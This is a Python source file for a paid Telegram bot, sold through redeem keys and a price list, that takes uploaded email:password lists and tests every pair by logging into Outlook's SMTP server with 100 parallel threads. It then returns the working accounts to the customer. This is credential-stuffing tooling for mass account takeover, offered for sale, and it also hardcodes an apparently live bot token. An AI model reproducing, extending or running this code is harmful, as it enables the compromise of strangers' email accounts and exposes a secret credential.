import random
import string
import time
import datetime
import os
import smtplib
import traceback
import concurrent.futures
import threading
from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from threading import Semaphore, Lock

# Telegram bot token and owner ID
TELEGRAM_BOT_TOKEN = '7469143794:AAErGmT2Y6u7kYhtFoKNxWIqfe11mPRgg0M'
owner_id = 6226675622

# Global variables for checking process
redeem_keys = {}  # Store redeem keys and their expiry
user_subscriptions = {}  # Store user subscriptions
sem = Semaphore(2)
valid_count = 0
invalid_count = 0
checked_count = 0
total_emails = 0
progress_message = None
start_time = None
lock = Lock()
file_queue = []
queue_lock = Lock()

# Helper function to generate a 12-letter random key
def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# Function to save redeemed keys to file
def save_redeemed_keys():
    with open('redeemed.txt', 'w') as f:
        for key, data in redeem_keys.items():
            f.write(f"{key}:{data['expiry']}:{data.get('user_id', 'N/A')}\n")

# Function to load redeemed keys from file
def load_redeemed_keys():
    if os.path.exists('redeemed.txt'):
        with open('redeemed.txt', 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                key, expiry, user_id = parts[0], parts[1], parts[2]
                try:
                    expiry_date = datetime.datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S')
                except ValueError:
                    # Handle different format if necessary
                    try:
                        expiry_date = datetime.datetime.strptime(expiry, '%Y-%m-%d %H:%M')
                    except ValueError:
                        continue
                redeem_keys[key] = {'expiry': expiry_date, 'user_id': user_id if user_id != 'N/A' else None}


# Function to check if keys are expired and clean up
def clean_expired_keys():
    current_time = datetime.datetime.now()
    keys_to_remove = [key for key, data in redeem_keys.items() if current_time > data['expiry']]
    for key in keys_to_remove:
        del redeem_keys[key]
    save_redeemed_keys()

# Function to check email credentials
def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message)
        server.quit()
        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        return f"{str(e)}\n{traceback.format_exc()}"

# Function to update progress
def update_progress(update, context):
    global progress_message, valid_count, invalid_count, checked_count, start_time

    while checked_count < total_emails:
        with lock:
            elapsed_time = time.time() - start_time
            rate = (checked_count / elapsed_time) * 60 if elapsed_time > 0 else 0

        keyboard = [
            [InlineKeyboardButton(f"Valid: {valid_count}", callback_data='valid')],
            [InlineKeyboardButton(f"Invalid: {invalid_count}", callback_data='invalid')],
            [InlineKeyboardButton(f"Rate: {rate:.2f} accounts/min", callback_data='rate')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = f"Checked: {checked_count}/{total_emails}\nValid: {valid_count}\nInvalid: {invalid_count}\nRate: {rate:.2f} accounts/min"

        if progress_message:
            context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=progress_message, text=text, reply_markup=reply_markup)
        else:
            msg = update.message.reply_text(text=text, reply_markup=reply_markup)
            progress_message = msg.message_id

        time.sleep(30)

# Function to check email and password
def check_emailpass(emailpass, live_path, dead_path, update, context):
    global valid_count, invalid_count, checked_count

    e = str(emailpass).strip().split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open(live_path, 'a') as file:
            file.write(emailpass + '\n')
        with lock:
            valid_count += 1
    else:
        with open(dead_path, 'a') as file:
            file.write(emailpass + '\n')
        with lock:
            invalid_count += 1
    with lock:
        checked_count += 1

    # Update message every 200 accounts
    if checked_count % 200 == 0:
        with lock:
            elapsed_time = time.time() - start_time
            rate = (checked_count / elapsed_time) * 60 if elapsed_time > 0 else 0
        keyboard = [
            [InlineKeyboardButton(f"Valid: {valid_count}", callback_data='valid')],
            [InlineKeyboardButton(f"Invalid: {invalid_count}", callback_data='invalid')],
            [InlineKeyboardButton(f"Rate: {rate:.2f} accounts/min", callback_data='rate')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = f"Checked: {checked_count}/{total_emails}\nValid: {valid_count}\nInvalid: {invalid_count}\nRate: {rate:.2f} accounts/min"
        context.bot.edit_message_text(chat_id=update.message.chat_id, message_id=progress_message, text=text, reply_markup=reply_markup)

# Function to process the file
def process_file(update: Update, context: CallbackContext):
    global valid_count, invalid_count, checked_count, progress_message, start_time, total_emails

    with queue_lock:
        file_queue.append((update, context))

    if len(file_queue) > 1:
        context.bot.send_message(chat_id=update.message.chat_id, text="Your file has been added to the queue. Please wait 50 seconds before the check starts.")
    else:
        while file_queue:
            with queue_lock:
                update, context = file_queue.pop(0)

            valid_count = 0
            invalid_count = 0
            checked_count = 0
            progress_message = None

            file = update.message.document.get_file()
            file_path = f"{update.message.chat_id}.txt"
            file.download(file_path)

            with open(file_path, 'r') as f:
                emails = f.readlines()
                total_emails = len(emails)
                
                if total_emails > 15000:
                    context.bot.send_message(chat_id=update.message.chat_id, text="The file is too large. Please provide a file with less than 15,000 accounts.")
                    os.remove(file_path)
                    continue

            live_path = "akatsuki_mail_checker.txt"
            dead_path = f"dead_{update.message.chat_id}.txt"

            context.bot.send_message(chat_id=update.message.chat_id, text="Checking...")
            time.sleep(50)

            start_time = time.time()

            # Start the progress updater thread
            threading.Thread(target=update_progress, args=(update, context)).start()

            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                for emailpass in emails:
                    executor.submit(check_emailpass, emailpass, live_path, dead_path, update, context)

            # Send final result
            with open(live_path, 'rb') as f:
                update.message.reply_document(InputFile(f, filename=live_path))

            os.remove(file_path)
            os.remove(live_path)
            os.remove(dead_path)

            # Signal that processing is done
            sem.release()

            if file_queue:
                continue

# Command to start the bot
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Please provide the redeem key that you got from @sigmaraven68 using /redeem <key>.")

# Command to generate a new key
def generate(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != owner_id:
        update.message.reply_text("You don't have permission to generate keys.")
        return

    if len(context.args) != 2 or not context.args[0].isdigit() or not context.args[1].isdigit():
        update.message.reply_text("Usage: /generate <duration_in_days> <number_of_keys>")
        return

    try:
        days = int(context.args[0])
        num_keys = int(context.args[1])
    except ValueError:
        update.message.reply_text("Invalid input. Please provide valid numbers.")
        return

    generated_keys = []
    for _ in range(num_keys):
        key = generate_key()
        expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
        redeem_keys[key] = {'expiry': expiry_date}
        generated_keys.append(f"Key: {key}\nExpiry Date: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")

    save_redeemed_keys()  # Save keys to file

    # Send all generated keys to the user
    message = "\n\n".join(generated_keys)
    update.message.reply_text(f"Generated {num_keys} keys:\n\n{message}")



# Command to redeem a key
def redeem(update: Update, context: CallbackContext):
    if len(context.args) != 1:
        update.message.reply_text("Usage: /redeem <key>")
        return

    key = context.args[0]
    if key not in redeem_keys:
        update.message.reply_text("Invalid key. Please contact @sigmaraven68 for assistance.")
        return

    expiry_date = redeem_keys[key]['expiry']
    if datetime.datetime.now() > expiry_date:
        update.message.reply_text("The key has expired. Please contact @sigmaraven68 for a new key.")
        del redeem_keys[key]
        save_redeemed_keys()  # Save keys to file
        return

    user_id = update.message.from_user.id
    if any(user['key'] == key for user in user_subscriptions.values()):
        update.message.reply_text("This key has already been redeemed by someone else.")
        return

    user_subscriptions[user_id] = {'key': key, 'expiry': expiry_date}
    save_redeemed_keys()  # Save keys to file
    update.message.reply_text(f"Key redeemed successfully! Your subscription is valid until {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}.")

    # Save to redeemed.txt
    with open('redeemed.txt', 'a') as f:
        f.write(f"{key}:{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}:{user_id}\n")


    # Save to redeemed.txt
    with open('redeemed.txt', 'a') as f:
        f.write(f"{key}:{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}:{user_id}\n")

# Command to get information about the bot
def info(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in user_subscriptions:
        update.message.reply_text("You need to redeem a key first. Use /redeem <key>.")
        return

    subscription = user_subscriptions[user_id]
    expiry_date = subscription['expiry'].strftime('%Y-%m-%d')
    update.message.reply_text(f"Your subscription is valid until {expiry_date}.")

# Command to show bot's ping
def ping(update: Update, context: CallbackContext):
    start_time = time.time()
    update.message.reply_text("Pong!")
    elapsed_time = time.time() - start_time
    update.message.reply_text(f"Ping: {elapsed_time * 1000:.2f} ms")

# Command to display available options
def buy(update: Update, context: CallbackContext):
    update.message.reply_text("Price list:\n- 1 month: $10\n- 6 months: $50\n- 1 year: $90")

# Command to stop the bot
def stop(update: Update, context: CallbackContext):
    update.message.reply_text("Stopping the bot.")
    os._exit(0)

def main():
    load_redeemed_keys()

    updater = Updater(TELEGRAM_BOT_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('generate', generate))
    dispatcher.add_handler(CommandHandler('redeem', redeem))
    dispatcher.add_handler(CommandHandler('info', info))
    dispatcher.add_handler(CommandHandler('ping', ping))
    dispatcher.add_handler(CommandHandler('buy', buy))
    dispatcher.add_handler(CommandHandler('stop', stop))
    dispatcher.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), process_file))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
